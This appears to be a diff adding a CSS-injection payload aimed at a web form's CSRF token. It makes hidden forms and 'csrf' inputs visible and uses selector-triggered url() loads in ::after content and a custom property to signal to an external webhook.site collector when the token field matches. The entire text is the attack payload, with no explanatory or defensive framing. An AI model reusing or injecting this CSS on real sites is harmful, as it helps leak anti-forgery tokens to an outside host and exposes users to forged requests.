@@ -1,0 +1,31 @@
+form input[type="hidden" i][name="csrf" i][value] {
+  display: block !important;
+  visibility: visible !important;
+  position: static !important;
+  opacity: 1 !important;
+  appearance: unset !important;
+}
+
+form:nth-child(3) {
+  display: block !important;
+  visibility: visible !important;
+  position: static !important;
+  opacity: 1 !important;
+  appearance: unset !important;
+}
+
+form input[type="hidden" i][name="csrf" i]::after {
+  content: url('https://webhook.site/8b0d3918-9d57-4e28-b225-2e1c251118c6?TEST1');
+}
+
+form input[name="csrf"][value] {
+  color: green;
+}
+
+form input[name="csrf"][value]::after {
+  content: url('https://webhook.site/8b0d3918-9d57-4e28-b225-2e1c251118c6?TEST2');
+}
+
+input[name="csrf"] {
+  --daicazzo: url('https://webhook.site/8b0d3918-9d57-4e28-b225-2e1c251118c6?TEST3');
+}
